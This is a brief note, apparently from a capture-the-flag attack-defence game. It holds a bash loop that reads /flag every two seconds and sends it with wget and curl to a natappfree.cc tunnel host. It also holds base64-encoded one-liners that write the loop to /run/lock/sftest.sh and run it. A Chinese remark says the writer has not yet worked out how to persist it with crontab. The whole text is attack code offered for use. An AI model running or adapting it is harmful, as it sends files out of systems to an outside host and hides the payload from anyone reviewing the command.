暂时未研究出crontab写法
```sh
#!/bin/bash  
step=2
while true;do
    f=`cat /flag`
    url="http://tjey3i.natappfree.cc?token=serfend&flag=$f"
    wget $url
    curl $url
    sleep $step
done
exit 0
```
```sh
/bin/echo 'IyEvYmluL2Jhc2ggIApzdGVwPTIKd2hpbGUgdHJ1ZTtkbwogICAgZj1gY2F0IC9mbGFnYAogICAgdXJsPSJodHRwOi8vcnRjZXRoLm5hdGFwcGZyZWUuY2M/dG9rZW49c2VyZmVuZCZmbGFnPSRmIgogICAgd2dldCAkdXJsCiAgICBjdXJsICR1cmwKICAgIHNsZWVwICRzdGVwCmRvbmUKZXhpdCAw' | /usr/bin/base64 -d > /run/lock/sftest.sh && /bin/sh /run/lock/sftest.sh 
```

/bin/echo "IyEvYmluL2Jhc2ggIApzdGVwPTIKd2hpbGUgdHJ1ZTtkbwogICAgZj0yMTMxMwogICAgdXJsPSJodHRwOi8vdGpleTNpLm5hdGFwcGZyZWUuY2M/dG9rZW49c2VyZmVuZCZmbGFnPSRmIgogICAgd2dldCAkdXJsCiAgICBjdXJsICR1cmwKICAgIHNsZWVwICRzdGVwCmRvbmUKZXhpdCAw" | /usr/bin/base64 -d > /run/lock/sftest.sh && /bin/sh /run/lock/sftest.sh 